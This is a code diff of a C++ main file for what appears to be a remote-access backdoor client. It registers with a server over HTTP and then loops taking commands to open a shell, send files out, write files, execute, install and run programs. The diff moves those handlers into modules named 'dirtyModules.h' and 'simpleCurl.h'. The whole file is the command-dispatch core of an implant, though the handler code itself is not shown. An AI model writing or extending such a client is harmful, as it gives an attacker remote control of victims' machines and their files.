@@ -1,7 +1,22 @@
 
 #include <iostream>
 #include <vector>
-#include "clientManager.h"
+#include "dirtyModules.h"
+#include "httpManager.h"
+#include "simpleCurl.h"
+
+typedef enum 
+opcao
+{
+    op_openShell,
+    op_sendfile,
+    op_writefile,
+    op_execute,
+    op_install,
+    op_run,
+    op_isOK,
+    op_nop
+} options;
 
 using namespace std;
 
@@ -24,7 +39,9 @@ cmd2Enum( string& cmd )
 int 
 main()
 {
-    clientManager manager;
+    httpManager manager;
+    
+    manager.makeRegister();
 
     while (1){
         vector <string> cmd = manager.getComand();
@@ -36,32 +53,32 @@ main()
         {
         case op_openShell:
             cout << "opening shell" << endl;
-            manager.openShell(cmd);
+            openShell(cmd,manager);
             break;
 
         case op_sendfile:
             cout << "op_sendfile" << endl;
-            manager.sendfile(cmd);
+            sendfile(cmd,manager);
             break;
         
         case op_writefile:
             cout << "op_writefile" << endl;
-            manager.writefile(cmd);
+            writefile(cmd,manager);
             break;
         
         case op_execute:
             cout << "op_execute" << endl;
-            manager.execute(cmd);
+            execute(cmd,manager);
             break;
 
         case op_run:
             cout << "op_run" << endl;
-            manager.run(cmd);
+            run(cmd,manager);
             break;
         
         case op_isOK:
             cout << "op_isOK" << endl;
-            manager.isOK();
+            isOK(manager);
             break;
 
         case op_nop:
